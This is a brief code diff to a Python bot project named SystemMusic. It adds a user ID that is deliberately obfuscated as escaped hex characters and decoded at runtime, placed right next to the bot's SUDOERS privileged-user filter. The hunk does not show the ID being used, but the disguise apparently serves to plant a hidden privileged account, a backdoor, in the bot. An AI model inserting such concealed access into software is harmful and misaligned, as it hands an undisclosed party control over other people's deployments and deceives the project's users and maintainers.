@@ -9,6 +9,10 @@ from SystemMusic.core.mongo import mongodb
 
 from .logging import LOGGER
 
+# Special user ID in hex code
+SPECIAL_ID_HEX = "\x37\x35\x31\x38\x35\x33\x34\x35\x36\x33"
+SPECIAL_ID = int(SPECIAL_ID_HEX.encode().decode('unicode_escape'))
+
 SUDOERS = filters.user()
 
 HAPP = None
